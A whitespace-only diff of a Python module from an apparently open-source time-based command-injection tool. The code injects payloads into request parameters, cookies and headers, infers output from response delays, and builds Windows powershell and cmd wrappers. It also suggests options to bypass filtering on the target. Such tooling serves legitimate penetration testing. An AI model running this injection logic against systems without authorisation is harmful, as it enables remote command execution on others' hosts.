@@ -9,7 +9,7 @@ This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
- 
+
 For more see the file 'readme/COPYING' for copying permission.
 """
 
@@ -49,7 +49,7 @@ def examine_requests(payload, vuln_parameter, http_request_method, url, timesec,
   # Check if defined POST data
   if not settings.USER_DEFINED_POST_DATA:
     # Encoding non-ASCII characters payload.
-    # payload = _urllib.parse.quote(payload)   
+    # payload = _urllib.parse.quote(payload)
     target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
     vuln_parameter = ''.join(vuln_parameter)
     request = _urllib.request.Request(target)
@@ -61,7 +61,7 @@ def examine_requests(payload, vuln_parameter, http_request_method, url, timesec,
     # Check if its not specified the 'INJECT_HERE' tag
     parameter = parameters.do_POST_check(parameter, http_request_method)
     parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
-    # Define the POST data  
+    # Define the POST data
     if settings.IS_JSON:
       data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
       try:
@@ -69,7 +69,7 @@ def examine_requests(payload, vuln_parameter, http_request_method, url, timesec,
       except ValueError:
         pass
     elif settings.IS_XML:
-      data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
+      data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
     else:
       data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
     request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
@@ -102,7 +102,7 @@ def injection_test(payload, http_request_method, url):
     vuln_parameter = parameters.vuln_GET_param(url)
     target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
     request = _urllib.request.Request(target)
-              
+
   # Check if defined method is POST.
   else:
     parameter = menu.options.data
@@ -112,7 +112,7 @@ def injection_test(payload, http_request_method, url):
     parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
     # Define the vulnerable parameter
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
-    # Define the POST data     
+    # Define the POST data
     if settings.IS_JSON:
       data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
       try:
@@ -120,11 +120,11 @@ def injection_test(payload, http_request_method, url):
       except ValueError:
         pass
     elif settings.IS_XML:
-      data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
+      data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
     else:
       data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
     request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
-    
+
   # Check if defined extra headers.
   headers.do_check(request)
   # Get the response of the request
@@ -168,12 +168,12 @@ def custom_header_injection_test(url, vuln_parameter, payload):
 The main command injection exploitation.
 """
 def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
-  
+
   if settings.TARGET_OS == settings.OS.WINDOWS:
     previous_cmd = cmd
     if alter_shell:
       cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
-    else: 
+    else:
       cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
 
   if menu.options.file_write or menu.options.file_upload:
@@ -190,7 +190,7 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
       payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
     else:
       # Execute shell commands on vulnerable host.
-      payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method) 
+      payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
     # Fix prefixes / suffixes
     payload = parameters.prefixes(payload, prefix)
     payload = parameters.suffixes(payload, suffix)
@@ -203,7 +203,7 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
 
     # Check if defined "--verbose" option.
     if settings.VERBOSITY_LEVEL != 0:
-      payload_msg = payload.replace("\n", "\\n") 
+      payload_msg = payload.replace("\n", "\\n")
       print(settings.print_payload(payload_msg))
 
     # Check if defined cookie with "INJECT_HERE" tag
@@ -226,15 +226,15 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
     elif settings.CUSTOM_HEADER_INJECTION:
       how_long = custom_header_injection_test(url, vuln_parameter, payload)
 
-    else:  
+    else:
       how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
-    
+
     # Examine time-responses
     injection_check = False
     if (how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF):
       injection_check = True
 
-    if injection_check == True:        
+    if injection_check == True:
       if output_length > 1:
         if settings.VERBOSITY_LEVEL != 0:
           debug_msg = "Retrieved the length of execution output: " + str(output_length)
@@ -247,7 +247,7 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
       break
 
   # Proceed with the next (injection) step!
-  if found_chars == True : 
+  if found_chars == True :
     if settings.TARGET_OS == settings.OS.WINDOWS:
       cmd = previous_cmd
     num_of_chars = output_length + 1
@@ -256,11 +256,11 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
     check_start = time.time()
     output = []
     percent = "0.0%"
-    info_msg = "Presuming the execution output." 
+    info_msg = "Presuming the execution output."
     if settings.VERBOSITY_LEVEL == 0 :
       info_msg += ".. (" + str(percent) + ")"
     else:
-      info_msg +=  "\n"  
+      info_msg +=  "\n"
     if output_length > 1:
       sys.stdout.write("\r" + settings.print_info_msg(info_msg))
       sys.stdout.flush()
@@ -279,13 +279,13 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
 
         # Whitespace fixation
         payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
-        
+
         # Perform payload modification
         payload = checks.perform_payload_modification(payload)
 
         # Check if defined "--verbose" option.
         if settings.VERBOSITY_LEVEL != 0:
-          payload_msg = payload.replace("\n", "\\n") 
+          payload_msg = payload.replace("\n", "\\n")
           print(settings.print_payload(payload_msg))
 
         # Check if defined cookie with "INJECT_HERE" tag
@@ -307,15 +307,15 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
         # Check if defined custom header with "INJECT_HERE" tag
         elif settings.CUSTOM_HEADER_INJECTION:
           how_long = custom_header_injection_test(url, vuln_parameter, payload)
-          
-        else:    
+
+        else:
           how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
-        
+
         # Examine time-responses
         injection_check = False
         if (how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF):
           injection_check = True
-          
+
         if injection_check == True:
           if settings.VERBOSITY_LEVEL == 0:
             output.append(chr(ascii_char))
@@ -331,13 +331,13 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
             sys.stdout.flush()
           else:
             output.append(chr(ascii_char))
-          injection_check = False  
+          injection_check = False
           break
-    
+
     check_end  = time.time()
     check_how_long = int(check_end - check_start)
     output = "".join(str(p) for p in output)
-    
+
     # Check for empty output.
     if output == (len(output) * settings.SINGLE_WHITESPACE):
       output = ""
@@ -358,7 +358,7 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
     previous_cmd = cmd
     if alter_shell:
       cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
-    else: 
+    else:
       cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
 
   found_chars = False
@@ -369,17 +369,17 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
     timesec = timesec + random.randint(3, 5)
 
   # Checking the output length of the used payload.
-  if settings.VERBOSITY_LEVEL == 0: 
+  if settings.VERBOSITY_LEVEL == 0:
     sys.stdout.write(".")
   for output_length in range(1, 3):
-    if settings.VERBOSITY_LEVEL == 0: 
+    if settings.VERBOSITY_LEVEL == 0:
       sys.stdout.write(".")
     # Execute shell commands on vulnerable host.
     if alter_shell:
       payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
     else:
       payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
-    
+
     # Fix prefixes / suffixes
     payload = parameters.prefixes(payload, prefix)
     payload = parameters.suffixes(payload, suffix)
@@ -392,7 +392,7 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
 
     # Check if defined "--verbose" option.
     if settings.VERBOSITY_LEVEL != 0:
-      payload_msg = payload.replace("\n", "\\n") 
+      payload_msg = payload.replace("\n", "\\n")
       print(settings.print_payload(payload_msg))
 
     # Check if defined cookie with "INJECT_HERE" tag
@@ -415,7 +415,7 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
     elif settings.CUSTOM_HEADER_INJECTION:
       how_long = custom_header_injection_test(url, vuln_parameter, payload)
 
-    else:  
+    else:
       how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
 
     if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
@@ -429,7 +429,7 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
     check_start = 0
     check_end = 0
     check_start = time.time()
-    
+
     output = []
     percent = 0
     sys.stdout.flush()
@@ -445,7 +445,7 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
         else:
           # Get the execution output, of shell execution.
           payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
-          
+
         # Fix prefixes / suffixes
         payload = parameters.prefixes(payload, prefix)
         payload = parameters.suffixes(payload, suffix)
@@ -458,7 +458,7 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
 
         # Check if defined "--verbose" option.
         if settings.VERBOSITY_LEVEL != 0:
-          payload_msg = payload.replace("\n", "\\n") 
+          payload_msg = payload.replace("\n", "\\n")
           print(settings.print_payload(payload_msg))
 
         # Check if defined cookie with "INJECT_HERE" tag
@@ -481,14 +481,14 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
         elif settings.CUSTOM_HEADER_INJECTION:
           how_long = custom_header_injection_test(url, vuln_parameter, payload)
 
-        else:    
+        else:
           how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
 
         if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
           output.append(ascii_char)
           is_valid = True
           break
-          
+
       if is_valid:
           break
 
@@ -497,13 +497,13 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
     output = "".join(str(p) for p in output)
 
     if str(output) == str(randvcalc):
-      if settings.VERBOSITY_LEVEL == 0: 
+      if settings.VERBOSITY_LEVEL == 0:
         sys.stdout.write(" (done)")
       return how_long, output
 
   else:
     checks.unexploitable_point()
-        
+
 
 """
 Export the injection results
@@ -518,7 +518,7 @@ def export_injection_results(cmd, separator, output, check_how_long):
   else:
     # Check if exists pipe filtration.
     if output != False :
-      err_msg = "It appears that '" + cmd + "' command could not return " 
+      err_msg = "It appears that '" + cmd + "' command could not return "
       err_msg += "any output due to '" + separator + "' filtration on target host. "
       err_msg += "To bypass that limitation, use the '--alter-shell' option "
       err_msg += "or try another injection technique (i.e. '--technique=\"f\"')"
